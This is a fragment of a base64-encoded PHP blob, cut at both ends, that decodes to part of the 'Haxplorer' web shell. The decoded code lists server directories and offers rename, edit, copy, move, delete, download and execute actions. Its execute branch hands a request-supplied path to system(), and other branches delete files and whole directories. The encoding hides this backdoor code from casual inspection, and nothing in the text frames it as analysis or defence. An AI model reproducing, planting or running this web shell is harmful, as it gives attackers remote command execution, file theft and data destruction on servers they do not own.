rIDE7CgogCQkkZmlsZW5vCT0gY291bnQoJGZpbGVuKSArIDE7CgoKCiAgCQlmdW5jdGlvbiBteWNtcCgkYSwgJGIpewoKCQkJaWYgKCRhID09ICRiKSByZXR1cm4gMDsKCgkJCXJldHVybiAoc3RydG9sb3dlcigkYSkgPCBzdHJ0b2xvd2VyKCRiKSkgPyAtMSA6IDE7CgoJCX0KCgoKCQlpZiAoZnVuY3Rpb25fZXhpc3RzKCJ1c29ydCIpKSB7CgoJCQl1c29ydCgkZGlybiwgIm15Y21wIik7CgoJCQl1c29ydCgkZmlsZW4sICJteWNtcCIpOwoKCQl9CgoJCWVsc2UgewoKCQkJc29ydCAoJGRpcm4pOwoKCSAJCXNvcnQgKCRmaWxlbik7CgoJIAl9CgoJcmVzZXQgKCRkaXJuKTsKCiAJcmVzZXQgKCRmaWxlbik7CgogCWlmIChmdW5jdGlvbl9leGlzdHMoJ2FycmF5X21lcmdlJykpIHsKCgkJJGZpbGVsaXN0ID0gYXJyYXlfbWVyZ2UgKCRkaXJuLCAkZmlsZW4pOwoKCX0KCiAJZWxzZSB7CgoJCSRmaWxlbGlzdCA9ICRkaXJuICsgJGZpbGVuOwoKCX0KCgoKCQoKCWlmICggY291bnQoJGZpbGVsaXN0KS0xID4gJFBtYXggKSB7CgoJCSRmcm9tID0gJFBpZHggKiAkUG1heDsKCgkJJHRvID0gKCRQaWR4ICsgMSkgKiAkUG1heC0xOwoKCQlpZiAoJHRvIC0gY291bnQoJGZpbGVsaXN0KSAtIDEgKyAoJFBtYXggLyAyKSA+IDAgKQoKCQkJJHRvID0gY291bnQoJGZpbGVsaXN0KSAtIDE7CgoJCWlmICgkdG8gPiBjb3VudCgkZmlsZWxpc3QpLTEpCgoJCQkkdG8gPSBjb3VudCgkZmlsZWxpc3QpLTE7CgoJCSREY29udGVudHMgPSBhcnJheSgpOwoKCQlGb3IgKCRGaSA9ICRmcm9tOyAkRmkgPD0gJHRvOyAkRmkrKykgewoKCQkJJERjb250ZW50c1tdID0gJGZpbGVsaXN0WyRGaV07CQoKCQl9CgoKCgl9CgoJZWxzZSB7CgoJCSREY29udGVudHMgPSAkZmlsZWxpc3Q7CgoJfQoKCQoKICAgICAkdGRjb2xvcnMgPSBhcnJheSgibGlnaHR0ZCIsICJkYXJrdGQiKTsKCgoKICAgICB3aGlsZSAobGlzdCAoJGtleSwgJGZpbGUpID0gZWFjaCAoJERjb250ZW50cykpIHsKCiAgICAgICAgICBpZiAoISR0ZGNvbG9yPWFycnZhbChlYWNoKCR0ZGNvbG9ycykpKSB7CgoJICAgIHJlc2V0KCR0ZGNvbG9ycyk7CgoJICAgICR0ZGNvbG9yID0gYXJydmFsKGVhY2goJHRkY29sb3JzKSk7CSAgfQoKCSAgCSAgICAgICAgIAoKIAkJaWYgKGlzX2RpcigiJGRpci8kZmlsZSIpKSB7IC8qIDwhLS0gSWYgaXQncyBhIERpcmVjdG9yeSAtLT4gKi8KCiAgICAgICAgICAJCQkvKiA8IS0tIERpcm5hbWUgLS0+ICovCgoJCQllY2hvICI8dHI+PHRkIE5PV1JBUCBjbGFzcz1cInRvcCBsZWZ0IHJpZ2h0ICR0ZGNvbG9yXCI+Ii5zcCgzKS5idWlsZFVybCggIlskZmlsZV0iLCAiY21kPWRpciZkaXI9JGRpci8kZmlsZSIpIC5zcCg5KS4iPC90ZD5cbiI7CgogIAkJCQkvKiA8IS0tIEFjdGlvbnMgLS0+ICovCgoJCQllY2hvICI8dGQgTk9XUkFQIGNsYXNzPVwidG9wIHJpZ2h0ICR0ZGNvbG9yXCI+PGNlbnRlcj4iLnNwKDIpLiJcbiI7CgogCQkJCS8qIDwhLS0gUmVuYW1lIC0tPiAqLwoKCQkJaWYgKCAoJGZpbGUgIT0gIi4iKSAmJiAoJGZpbGUgIT0gIi4uIikgKQoKCQkJCWVjaG8gYnVpbGRVcmwoJGltZ1siUmVuYW1lIl0sICJjbWQ9cmVuJmxhc3RjbWQ9ZGlyJmxhc3RkaXI9JGRpciZvbGRmaWxlPSRkaXIvJGZpbGUiKS5zcCgzKS4iXG4iOwoKIAkJCQkvKiA8IS0tIERlbGV0ZSAtLT4gKi8KCgkJCWlmICggKCRmaWxlICE9ICIuIikgJiYgKCRmaWxlICE9ICIuLiIpICkKCgkJCQllY2hvIHNwKDMpLmJ1aWxkVXJsKCAkaW1nWyJEZWxldGUiXSwgImNtZD1kZWxkaXImZmlsZT0kZGlyLyRmaWxlJmxhc3RjbWQ9ZGlyJmxhc3RkaXI9JGRpciIpLiJcbiI7CgoJCQkJLyogPCEtLSBFbmQgb2YgQWN0aW9ucyAtLT4gKi8KCgkJCWVjaG8gIiZuYnNwOyZuYnNwOzwvY2VudGVyPjwvdGQ+XG4iOwoKICAJCQkJLyogPCEtLSBTaXplIC0tPiAqLwoKCQkJZWNobyAiPHRkIE5PV1JBUCBjbGFzcz1cInRvcCByaWdodCAkdGRjb2xvclwiPiZuYnNwOzwvdGQ+XG4iOwoKIAkJCQkvKiA8IS0tIEF0dHJpYnV0ZXMgLS0+ICovCgoJCQllY2hvICI8dGQgTk9XUkFQIGNsYXNzPVwidG9wIHJpZ2h0ICR0ZGNvbG9yXCI+Jm5ic3A7Jm5ic3A7XG4iOwoKIAkJCWVjaG8gIjxzdHJvbmc+RDwvc3Ryb25nPiI7CgoJCSAgICAgICAgaWYgKCBAaXNfcmVhZGFibGUoIiRkaXIvJGZpbGUiKSApIHsKCiAgIAkJCQllY2hvICI8c3Ryb25nPlI8L3N0cm9uZz4iOwoKIAkJCX0KCiAJCQlpZiAoZnVuY3Rpb25fZXhpc3RzKCdpc193cml0ZWFibGUnKSkgewoKCQkJCWlmICggQGlzX3dyaXRlYWJsZSgiJGRpci8kZmlsZSIpICkgewoKIAkJCQkJZWNobyAiPHN0cm9uZz5XPC9zdG9uZz4iOwoKIAkJCQl9CgoJCQl9CgogCQkJZWxzZSB7CgogICAgCQkJCWVjaG8gIjxzdHJvbmc+KFcpPC9zdG9uZz4iOwoKICAJCQl9CgogIAkJCWlmICggQGlzX2V4ZWN1dGFibGUoIiRkaXIvJGZpbGUiKSApIHsKCiAJCQkJZWNobyAiPFN0cm9uZz5YPHN0cm9uZz4iOwoKIAkJCX0KCiAJCQllY2hvICImbmJzcDsmbmJzcDs8L3RkPlxuIjsKCiAJCQkJLyogPCEtLSBEYXRlIC0tPiAqLwoKCQkJZWNobyAiPHRkIE5PV1JBUCBjbGFzcz1cInRvcCByaWdodCAkdGRjb2xvclwiIE5PV1JBUD5cbiI7CgogCQkJZWNobyAiJm5ic3A7Jm5ic3A7Ii5kYXRlKCJEIGQtbS1ZIEg6aTpzIiwgZmlsZW10aW1lKCIkZGlyLyRmaWxlIikpLiImbmJzcDsmbmJzcDsiOwoKIAkJCWVjaG8gIjwvdGQ+IjsKCgkJCWVjaG8gIjwvdHI+XG4iOwoKCgogICAgICAgIAl9CgogIAkJZWxzZSB7IC8qIDwhLS0gVGhlbiBpdCBtdXN0IGJlIGEgRmlsZS4uLiAtLT4gKi8KCiAgICAgCQkJCS8qIDwhLS0gRmlsZW5hbWUgLS0+ICovCgoJCQlpZiAoIEBpc19yZWFkYWJsZSgiJGRpci8kZmlsZSIpICkKCiAJCQkJZWNobyAiPHRyPjx0ZCBOT1dSQVAgY2xhc3M9XCJ0b3AgbGVmdCByaWdodCAkdGRjb2xvclwiPiIuc3AoMykuYnVpbGRVcmwoICRmaWxlLCAiY21kPWZpbGUmZmlsZT0kZGlyLyRmaWxlIikuc3AoOSkuIjwvdGQ+XG4iOwoKICAJCQllbHNlCgogIAkJCQllY2hvICI8dHI+PHRkIE5PV1JBUCBjbGFzcz1cInRvcCBsZWZ0IHJpZ2h0ICR0ZGNvbG9yXCI+Ii5zcCgzKS4kZmlsZS5zcCg5KS4iPC90ZD5cbiI7CgogIAkJCSAgIAkJCQkvKiA8IS0tIEFjdGlvbnMgLS0+ICovCgoJCQllY2hvICI8dGQgTk9XUkFQIGNsYXNzPVwidG9wIHJpZ2h0ICR0ZGNvbG9yXCI+PGNlbnRlcj4mbmJzcDsmbmJzcDtcbiI7CgogCQkJCS8qIDwhLS0gUmVuYW1lIC0tPiAqLwoKCQkJZWNobyBidWlsZFVybCgkaW1nWyJSZW5hbWUiXSwgImNtZD1yZW4mbGFzdGNtZD1kaXImbGFzdGRpcj0kZGlyJm9sZGZpbGU9JGRpci8kZmlsZSIpLnNwKDMpLiJcbiI7CgogIAkJCQkvKiA8IS0tIEVkaXQgLS0+ICovCgoJCQlpZiAoIChAaXNfd3JpdGVhYmxlKCIkZGlyLyRmaWxlIikpICYmIChAaXNfcmVhZGFibGUoIiRkaXIvJGZpbGUiKSkgKQoKIAkJCQllY2hvIGJ1aWxkVXJsKCAkaW1nWyJFZGl0Il0sICJjbWQ9ZWRpdCZmaWxlPSRkaXIvJGZpbGUiKS5zcCgzKS4iXG4iOwoKICAgCQkJCS8qIDwhLS0gQ29weSAtLT4gKi8KCiAJCQllY2hvIGJ1aWxkVXJsKCAkaW1nWyJDb3B5Il0sICJjbWQ9Y29weSZmaWxlPSRkaXIvJGZpbGUiKS4iXG4iOwoKICAJCQkJLyogPCEtLSBNb3ZlIC0tPiAqLwoKCQkJaWYgKCAoQGlzX3dyaXRlYWJsZSgiJGRpci8kZmlsZSIpKSAmJiAoQGlzX3JlYWRhYmxlKCIkZGlyLyRmaWxlIikpICkKCiAJCQkJCWVjaG8gc3AoMykuIGJ1aWxkVXJsKCAkaW1nWyJNb3ZlIl0sICJjbWQ9bW92ZSZmaWxlPSRkaXIvJGZpbGUiKS4iXG4iOwoKICAgIAkJCQkvKiA8IS0tIERlbGV0ZSAtLT4gKi8KCgkJCWVjaG8gc3AoMykuIGJ1aWxkVXJsKCAkaW1nWyJEZWxldGUiXSwgImNtZD1kZWxmaWxlJmZpbGU9JGRpci8kZmlsZSZsYXN0Y21kPWRpciZsYXN0ZGlyPSRkaXIiKS4iXG4iOwoKIAkJCQkvKiA8IS0tIERvd25sb2FkIC0tPiAqLwoKCQkJZWNobyBzcCgzKS4gYnVpbGRVcmwoICRpbWdbIkRvd25sb2FkIl0sICJjbWQ9ZG93bmwmZmlsZT0kZGlyLyRmaWxlIikuIlxuIjsKCiAJCQkJLyogPCEtLSBFeGVjdXRlIC0tPiAqLwoKCQkJaWYgKCBAaXNfZXhlY3V0YWJsZSgiJGRpci8kZmlsZSIpICkKCiAJCQkJZWNobyBzcCgzKS5idWlsZFVybCggJGltZ1siRXhlY3V0ZSJdLCAiY21kPWV4ZWN1dGUmZmlsZT0kZGlyLyRmaWxlIikuIlxuIjsKCiAgICAJCQkJLyogPCEtLSBFbmQgb2YgQWN0aW9ucyAtLT4gKi8KCgkJCWVjaG8gc3AoMikuIjwvY2VudGVyPjwvdGQ+XG4iOwoKIAkJCQkvKiA8IS0tIFNpemUgLS0+ICovCgoJCQllY2hvICI8dGQgTk9XUkFQIGFsaWduPVwicmlnaHRcIiBjbGFzcz1cInRvcCByaWdodCAkdGRjb2xvclwiIE5PV1JBUCA+XG4iOwoKIAkJCSRzaXplID0gQGZpbGVzaXplKCIkZGlyLyRmaWxlIik7CgogCQkJSWYgKCRzaXplICE9IGZhbHNlKSB7CgoJCQkgICAgICAgICRmaWxlc2l6ZXMgKz0gJHNpemU7CgoJCQkJZWNobyAiJm5ic3A7Jm5ic3A7PHN0cm9uZz4iLmZvcm1hdHNpemUoJHNpemUpLiI8c3Ryb25nPiI7CgoJCQl9CgoJCQllbHNlCgoJCQkJZWNobyAiJm5ic3A7Jm5ic3A7PHN0cm9uZz4wIEI8c3Ryb25nPiI7CgogCQkJZWNobyAiJm5ic3A7Jm5ic3A7PC90ZD5cbiI7CgoKCiAJCQkJLyogPCEtLSBBdHRyaWJ1dGVzIC0tPiAqLwoKCQkJZWNobyAiPHRkIE5PV1JBUCBjbGFzcz1cInRvcCByaWdodCAkdGRjb2xvclwiPiZuYnNwOyZuYnNwO1xuIjsKCgoKIAkJCWlmICggQGlzX3JlYWRhYmxlKCIkZGlyLyRmaWxlIikgKQoKIAkJCQllY2hvICI8c3Ryb25nPlI8L3N0cm9uZz4iOwoKICAgCQkJaWYgKCBAaXNfd3JpdGVhYmxlKCIkZGlyLyRmaWxlIikgKQoKIAkJCQllY2hvICI8c3Ryb25nPlc8L3N0b25nPiI7CgogICAJCQlpZiAoIEBpc19leGVjdXRhYmxlKCIkZGlyLyRmaWxlIikgKQoKIAkJCQllY2hvICI8U3Ryb25nPlg8c3Ryb25nPiI7CgogICAJCQlpZiAoZnVuY3Rpb25fZXhpc3RzKCdpc191cGxvYWRlZF9maWxlJykpewoKIAkJCQlpZiAoIEBpc191cGxvYWRlZF9maWxlKCIkZGlyLyRmaWxlIikgKQoKIAkJCQkJZWNobyAiPFN0cm9uZz5VPHN0cm9uZz4iOwoKIAkJCX0KCiAJCQllbHNlIHsKCgkJCQllY2hvICI8U3Ryb25nPihVKTxzdHJvbmc+IjsKCgkJCX0KCiAJCQllY2hvICImbmJzcDsmbmJzcDs8L3RkPlxuIjsKCgkJCSAJLyogPCEtLSBEYXRlIC0tPiAqLwoKCQkJZWNobyAiPHRkIE5PV1JBUCBjbGFzcz1cInRvcCByaWdodCAkdGRjb2xvclwiIE5PV1JBUD5cbiI7CgogCQkJZWNobyAiJm5ic3A7Jm5ic3A7Ii5kYXRlKCJEIGQtbS1ZIEg6aTpzIiwgZmlsZW10aW1lKCIkZGlyLyRmaWxlIikpLiImbmJzcDsmbmJzcDsiOwoKIAkJCWVjaG8gIjwvdGQ+IjsKCiAJCQllY2hvICI8L3RyPlxuIjsKCiAJCX0KCiAgCX0KCgoKICAgIAllY2hvICI8L3RhYmxlPjx0YWJsZSB3aWR0aD0xMDAlIGJvcmRlcj1cIjBcIiBjZWxscGFkZGluZz1cIjBcIiBjZWxsc3BhY2luZz1cIjBcIj48dHI+XG48dGQgTk9XUkFQIHdpZHRoPTEwMCUgY2xhc3M9XCJzaWx2ZXIgYm9yZGVyIG5vcmlnaHRcIj5cbiI7CgogIAllY2hvICImbmJzcDsmbmJzcDsiLkBjb3VudCAoJGRpcm4pLiImbmJzcDtEaXIocyksJm5ic3A7Ii5AY291bnQgKCRmaWxlbikuIiZuYnNwO0ZpbGUocykmbmJzcDsmbmJzcDtcbiI7CgogIAllY2hvICI8L3RkPjx0ZCBOT1dSQVAgY2xhc3M9XCJzaWx2ZXIgYm9yZGVyIG5vbGVmdFwiPlxuIjsKCiAgCWVjaG8gIiZuYnNwOyZuYnNwO1RvdGFsIGZpbGVzaXplOiZuYnNwOyIuZm9ybWF0c2l6ZSgkZmlsZXNpemVzKS4iJm5ic3A7Jm5ic3A7PHRkPjwvdHI+XG4iOwoKCQoKCWZ1bmN0aW9uIHByaW50cGFnZWxpbmsoJGEsICRiLCAkbGluayA9ICIiKXsKCgkJaWYgKCRsaW5rICE9ICIiKSAKCgkJCWVjaG8gIjxBIEhSRUY9XCIkbGlua1wiPjxiPnwgJGEgLSAkYiB8PC9iPjwvQT4iOwoKCQllbHNlCgoJCQllY2hvICI8Yj58ICRhIC0gJGIgfDwvYj4iOwoKCX0KCiAgICAgICAgCgoJaWYgKCBjb3VudCgkZmlsZWxpc3QpLTEgPiAkUG1heCApIHsKCgkJZWNobyAiPHRyPjx0ZCBjb2xzcGFuPVwiMlwiIGNsYXNzPVwic2lsdmVyIGJvcmRlciBub3RvcFwiPjx0YWJsZSB3aWR0aD1cIjEwMCVcIiBjZWxsc3BhY2luZz1cIjBcIiBjZWxscGFkZGluZz1cIjNcIj48dHI+PHRkIHZhbGlnbj1cInRvcFwiPjxmb250IGNvbG9yPVwicmVkXCI+PGI+UGFnZTo8L2I+PC9mb250PjwvdGQ+PHRkIHdpZHRoPVwiMTAwJVwiPjxjZW50ZXI+IjsKCgkJJEZpID0gMDsKCgkJd2hpbGUgKCAoICgoJEZpKzEpKiRQbWF4KSArICgkUG1heC8yKSApIDwgY291bnQoJGZpbGVsaXN0KS0xICkgewoKCQkJJGZyb20gPSAkRmkqJFBtYXg7CgoJCQl3aGlsZSAoKCRmaWxlbGlzdFskZnJvbV09PSIuIikgfHwgKCRmaWxlbGlzdFskZnJvbV09PSIuLiIpKSAkZnJvbSsrOyAKCgkJCSR0byA9ICgkRmkgKyAxKSAqICRQbWF4IC0gMTsKCgkJCWlmICgkRmkgPT0gJFBpZHgpCgoJCQkJJGxpbms9IiI7CgoJCQllbHNlIAoKCQkJCSRsaW5rPSIkU0ZpbGVuYW1lPyR1cmxBZGQiLiJjbWQ9JGNtZCZkaXI9JGRpciZQaWR4PSRGaSI7CgoJCQlwcmludHBhZ2VsaW5rIChzdWJzdHIoc3RydG9sb3dlcigkZmlsZWxpc3RbJGZyb21dKSwgMCwgNSksIHN1YnN0cihzdHJ0b2xvd2VyKCRmaWxlbGlzdFskdG9dKSwgMCwgNSksICRsaW5rKTsKCgkJCWVjaG8gIiZuYnNwOyZuYnNwOyZuYnNwOyI7CgoJCQkkRmkrKzsKCgkJfQoKCQkkZnJvbSA9ICRGaSokUG1heDsKCgkJd2hpbGUgKCgkZmlsZWxpc3RbJGZyb21dPT0iLiIpIHx8ICgkZmlsZWxpc3RbJGZyb21dPT0iLi4iKSkgJGZyb20rKzsgCgoJCSR0byA9IGNvdW50KCRmaWxlbGlzdCktMTsKCgkJaWYgKCRGaSA9PSAkUGlkeCkKCgkJCSRsaW5rPSIiOwoKCQllbHNlIAoKCQkJJGxpbms9IiRTRmlsZW5hbWU/JHVybEFkZCIuImNtZD0kY21kJmRpcj0kZGlyJlBpZHg9JEZpIjsKCgkJcHJpbnRwYWdlbGluayAoc3Vic3RyKHN0cnRvbG93ZXIoJGZpbGVsaXN0WyRmcm9tXSksIDAsIDUpLCBzdWJzdHIoc3RydG9sb3dlcigkZmlsZWxpc3RbJHRvXSksIDAsIDUpLCAkbGluayk7CQkKCgkJCgoJCgoJCWVjaG8gIjwvY2VudGVyPjwvdGQ+PC90cj48L3RhYmxlPjwvdGQ+PC90cj4iOwoKCX0KCgoKCgogICAgCWVjaG8gIjwvdGFibGU+XG48YnI+PHRhYmxlIE5PV1JBUD4iOwoKCgogIAlpZiAoJGlzR29vZHZlcikgewoKCQllY2hvICI8dHI+PHRkIGNsYXNzPVwic2lsdmVyIGJvcmRlclwiPiZuYnNwOzxzdHJvbmc+U2VydmVyJ3MgUEhQIFZlcnNpb246Jm5ic3A7Jm5ic3A7PC9zdHJvbmc+Jm5ic3A7PC90ZD48dGQ+Jm5ic3A7JFBIUFZlciZuYnNwOzwvdGQ+PC90cj5cbiI7CgoJfQoKIAllbHNlIHsKCgkJZWNobyAiPHRyPjx0ZCBjbGFzcz1cInNpbHZlciBib3JkZXJcIj4mbmJzcDs8c3Ryb25nPlNlcnZlcidzIFBIUCBWZXJzaW9uOiZuYnNwOyZuYnNwOzwvc3Ryb25nPiZuYnNwOzwvdGQ+PHRkPiZuYnNwOyRQSFBWZXIgKFNvbWUgZnVuY3Rpb25zIG1pZ2h0IGJlIHVuYXZhaWxhYmxlLi4uKSZuYnNwOzwvdGQ+PC90cj5cbiI7CgoJfQoKICAgICAgCQkvKiA8IS0tIE90aGVyIEFjdGlvbnMgLS0+ICovCgogICAJZWNobyAiPHRyPjx0ZCBjbGFzcz1cInNpbHZlciBib3JkZXJcIj4mbmJzcDs8c3Ryb25nPk90aGVyIGFjdGlvbnM6Jm5ic3A7Jm5ic3A7PC9zdHJvbmc+Jm5ic3A7PC90ZD5cbiI7CgogIAllY2hvICI8dGQ+Jm5ic3A7PGI+Ii5idWlsZFVybCggInwgTmV3IEZpbGUgfCIsICJjbWQ9bmV3ZmlsZSZsYXN0Y21kPWRpciZsYXN0ZGlyPSRkaXIiKS4iXG4iLnNwKDMpLgoKCSAgICAgICAgICAgICAgICAgICAgIGJ1aWxkVXJsKCAifCBOZXcgRGlyZWN0b3J5IHwiLCAiY21kPW5ld2RpciZsYXN0Y21kPWRpciZsYXN0ZGlyPSRkaXIiKS4iXG4iLnNwKDMpLgoKCQkJICAgICBidWlsZFVybCggInwgVXBsb2FkIGEgRmlsZSB8IiwgImNtZD11cGxvYWQmZGlyPSRkaXImbGFzdGNtZD1kaXImbGFzdGRpcj0kZGlyIikuICI8L2I+XG48L3RkPjwvdHI+XG4iOwoKICAgIAllY2hvICI8dHI+PHRkIGNsYXNzPVwic2lsdmVyIGJvcmRlclwiPiZuYnNwOzxzdHJvbmc+U2NyaXB0IExvY2F0aW9uOiZuYnNwOyZuYnNwOzwvc3Ryb25nPiZuYnNwOzwvdGQ+PHRkPiZuYnNwOyRQQVRIX1RSQU5TTEFURUQ8L3RkPjwvdHI+XG4iOwoKICAJZWNobyAiPHRyPjx0ZCBjbGFzcz1cInNpbHZlciBib3JkZXJcIj4mbmJzcDs8c3Ryb25nPllvdXIgSVA6Jm5ic3A7Jm5ic3A7PC9zdHJvbmc+Jm5ic3A7PC90ZD48dGQ+Jm5ic3A7JFJFTU9URV9BRERSJm5ic3A7PC90ZD48L3RyPlxuIjsKCiAgCWVjaG8gIjx0cj48dGQgY2xhc3M9XCJzaWx2ZXIgYm9yZGVyXCI+Jm5ic3A7PHN0cm9uZz5Ccm93c2luZyBEaXJlY3Rvcnk6Jm5ic3A7Jm5ic3A7PC9zdHJvbmc+PC90ZD48dGQ+Jm5ic3A7JHBhcnRkaXImbmJzcDs8L3RkPjwvdHI+XG4iOwoKICAJZWNobyAiPHRyPjx0ZCB2YWxpZ249XCJ0b3BcIiBjbGFzcz1cInNpbHZlciBib3JkZXJcIj4mbmJzcDs8c3Ryb25nPkxlZ2VuZDombmJzcDsmbmJzcDs8L3N0cm9uZyZuYnNwOzwvdGQ+PHRkPlxuIjsKCiAgCWVjaG8gIjx0YWJsZSBOT1dSQVA+IjsKCiAgICAgICAgZWNobyAiPHRyPjx0ZD48c3Ryb25nPkQ6PC9zdHJvbmc+PC90ZD48dGQ+Jm5ic3A7Jm5ic3A7RGlyZWN0b3J5LjwvdGQ+PC90cj5cbiI7CgogICAJZWNobyAiPHRyPjx0ZD48c3Ryb25nPlI6PC9zdHJvbmc+PC90ZD48dGQ+Jm5ic3A7Jm5ic3A7UmVhZGFibGUuPC90ZD48L3RyPlxuIjsKCiAgCWVjaG8gIjx0cj48dGQ+PHN0cm9uZz5XOjwvc3Ryb25nPjwvdGQ+PHRkPiZuYnNwOyZuYnNwO1dyaXRlYWJsZS48L3RkPjwvdHI+XG4iOwoKICAJZWNobyAiPHRyPjx0ZD48c3Ryb25nPlg6PC9zdHJvbmc+PC90ZD48dGQ+Jm5ic3A7Jm5ic3A7RXhlY3V0YWJsZS48L3RkPjwvdHI+XG4iOwoKICAJZWNobyAiPHRyPjx0ZD48c3Ryb25nPlU6PC9zdHJvbmc+PC90ZD48dGQ+Jm5ic3A7Jm5ic3A7SFRUUCBVcGxvYWRlZCBGaWxlLjwvdGQ+PC90cj5cbiI7CgogIAllY2hvICI8L3RhYmxlPjwvdGQ+IjsKCiAJZWNobyAiPC90YWJsZT4iOwoKIAllY2hvICI8YnI+IjsKCiAgICAgCUBjbG9zZWRpcigkaCk7CgogIH0KCiAgZWxzZWlmICggJGNtZD09ImV4ZWN1dGUiICkgey8qPCEtLSBFeGVjdXRlIHRoZSBleGVjdXRhYmxlIC0tPiovCgogCWVjaG8gc3lzdGVtKCIkZmlsZSIpOwoKIH0KCmVsc2VpZiAoICRjbWQ9PSJkZWxkaXIiICkgeyAvKjwhLS0gRGVsZXRlIGEgZGlyZWN0b3J5IGFuZCBhbGwgaXQncyBmaWxlcyAtLT4gKi8KCgllY2hvICI8Y2VudGVyPjx0YWJsZT48dHI+PHRkIE5PV1JBUD4iIDsKCiAJaWYgKCRhdXRoID09ICJ5ZXMiKSB7CgoJCWlmIChNeWRlbGRpcigkZmlsZSk9PWZhbHNlKSB7CgogCQkJZWNobyAiQ291bGQgbm90IHJlbW92ZSBcIiRmaWxlXCI8YnI+UGVybWlzc2lvbiBkZW5pZWQsIG9yIGRpcmVjdG9yeSBub3QgZW1wdHkuLi4iOwoKICAJCX0KCiAJCWVsc2UgewoKIAkJCWVjaG8gIlN1Y2Nlc3NmdWxseSByZW1vdmVkIFwiJGZpbGVcIjxicj4iOwoKIAkJfQoKIAkJZWNobyAiPGZvcm0gYWN0aW9uPVwiJFNGaWxlTmFtZT8kdXJsQWRkXCIgbWV0aG9kPVwiUE9TVFwiPjxpbnB1dCB0eXBlPVwiaGlkZGVuXCIgbmFtZT1cImNtZFwiIHZhbHVlPVwiJGxhc3RjbWRcIj48aW5wdXQgdHlwZT1cImhpZGRlblwiIG5hbWU9XCJkaXJcIiB2YWx1ZT1cIiRsYXN0ZGlyXCI+PGlucHV0IHRhYmluZGV4PVwiMFwiIHR5cGU9XCJzdWJtaXRcIiB2YWx1ZT1cIkJhY2sgdG8gSGF4cGxvcmVyXCI+PC9mb3JtPiI7CgoJfQoKIAllbHNlIHsKCgkJZWNobyAiQXJlIHlvdSBzdXJlIHlvdSB3YW50IHRvIGRlbGV0ZSBcIiRmaWxlXCIgYW5kIGFsbCBpdCdzIHN1YmRpcmVjdG9yaWVzID8KCiAgICAgICAgPGZvcm0gYWN0aW9uPVwiJFNGaWxlTmFtZT8kdXJsQWRkXCIgbWV0aG9kPVwiUE9TVFwiPgoKICAgICAgICA8aW5wdXQgdHlwZT1cImhpZGRlblwiIG5hbWU9XCJjbWRcIiB2YWx1ZT1cImRlbGRpclwiPgoKICAgICAJPGlucHV0IHR5cGU9XCJoaWRkZW5cIiBuYW1lPVwibGFzdGNtZFwiIHZhbHVlPVwiJGxhc3RjbWRcIj4KCiAgICAgCTxpbnB1dCB0eXBlPVwiaGlkZGVuXCIgbmFtZT1cImxhc3RkaXJcIiB2YWx1ZT1cIiRsYXN0ZGlyXCI+CgogICAgIAk8aW5wdXQgdHlwZT1cImhpZGRlblwiIG5hbWU9XCJmaWxlXCIgdmFsdWU9XCIkZmlsZVwiPgoKICAgICAJPGlucHV0IHR5cGU9XCJoaWRkZW5cIiBuYW1lPVwiYXV0aFwiIHZhbHVlPVwieWVzXCI+CgogICAgIAk8aW5wdXQgdHlwZT1cInN1Ym1pdFwiIHZhbHVlPVwiWWVzXCI+PC9mb3JtPgoKICAgICAgICA8Zm9ybSBhY3Rpb249XCIkU0ZpbGVOYW1lPyR1cmxBZGRcIiBtZXRob2Q9XCJQT1NUXCI+CgoJPGlucHV0IHR5cGU9XCJoaWRkZW5cIiBuYW1lPVwiY21kXCIgdmFsdWU9XCIkbGFzdGNtZFwiPgoKCTxpbnB1dCB0eXBlPVwiaGlkZGVuXCIgbmFtZT1cImRpclwiIHZhbHVlPVwiJGxhc3RkaXJcIj4KCgk8aW5wdXQgdGFiaW5kZXg9XCIwXCIgdHlwZT1cInN1Ym1pdFwiIHZhbHVlPVwiTk8hXCI+PC9mb3JtPiI7CgogICAgICAgIH0KCiAJZWNobyAiPC90ZD48L3RyPjwvY2VudGVyPiI7Cgp9CgogZWxzZWlmICggJGNtZD09ImRlbGZpbGUiICkgeyAvKjwhLS0gRGVsZXRlIGEgZmlsZSAtLT4gKi8JZWNobyAiPGNlbnRlcj48dGFibGU+PHRyPjx0ZCBOT1dSQVA+IiA7CgogCWlmICgkYXV0aCA9PSAieWVzIikgewoKCQlpZiAoQHVubGluaygkZmlsZSk9PWZhbHNlKSB7CgogCQkJZWNobyAiQ291bGQgbm90IHJlbW92ZSBcIiRmaWxlXCI8YnI+IjsKCiAgCQl9CgogCQllbHNlIHsKCiAJCQllY2hvICJTdWNjZXNzZnVsbHkgcmVtb3ZlZCBcIiRmaWxlXCI8YnI+IjsKCiAJCX0KCgkJZWNobyAiPGZvcm0gYWN0aW9uPVwiJFNGaWxlTmFtZT8kdXJsQWRkXCIgbWV0aG9kPVwiUE9TVFwiPjxpbnB1dCB0eXBlPVwiaGlkZGVuXCIgbmFtZT1cImNtZFwiIHZhbHVlPVwiJGxhc3RjbWRcIj48aW5wdXQgdHlwZT1cImhpZGRlblwiIG5hbWU9XCJkaXJcIiB2YWx1ZT1cIiRsYXN0ZGlyXCI+PGlucHV0IHRhYmluZGV4PVwiMFwiIHR5cGU9XCJzdWJtaXRcIiB2YWx1ZT1cIkJhY2sgdG8gSGF4cGxvcmVyXCI+PC9mb3JtPiI7CgogICAgICAgIH0KCiAJZWxzZSB7CgogICAgICAgCWVjaG8gIkFyZSB5b3Ugc3VyZSB5b3Ugd2FudCB0byBkZWxldGUgXCIkZmlsZVwiID8KCiAgICAgIAk8Zm9ybSBhY3Rpb249XCIkU0ZpbGVOYW1lPyR1cmxBZGRcIiBtZXRob2Q9XCJQT1NUXCI+CgogICAgIAk8aW5wdXQgdHlwZT1cImhpZGRlblwiIG5hbWU9XCJjbWRcIiB2YWx1ZT1cImRlbGZpbGVcIj4KCiAgICAgCTxpbnB1dCB0eXBlPVwiaGlkZGVuXCIgbmFtZT1cImxhc3RjbWRcIiB2YWx1ZT1cIiRsYXN0Y21kXCI+CgogICAgIAk8aW5wdXQgdHlwZT1cImhpZGRlblwiIG5hbWU9XCJsYXN0ZGlyXCIgdmFsdWU9XCIkbGFzdGRpclwiPgoKICAgICAJPGlucHV0IHR5cGU9XCJoaWRkZW5cIiBuYW1lPVwiZmlsZVwiIHZhbHVlPVwiJGZpbGVcIj4KCiAgICAgCTxpbnB1dCB0eXBlPVwiaGlkZGVuXCIgbmFtZT1cImF1dGhcIiB2YWx1ZT1cInllc1wiPgoKCgogICAgIAk8aW5wdXQgdHlwZT1cInN1Ym1pdFwiIHZhbHVlPVwiWWVzXCI+PC9mb3JtPgoKICAgICAgIAk8Zm9ybSBhY3Rpb249XCIkU0ZpbGVOYW1lPyR1cmxBZGRcIiBtZXRob2Q9XCJQT1NUXC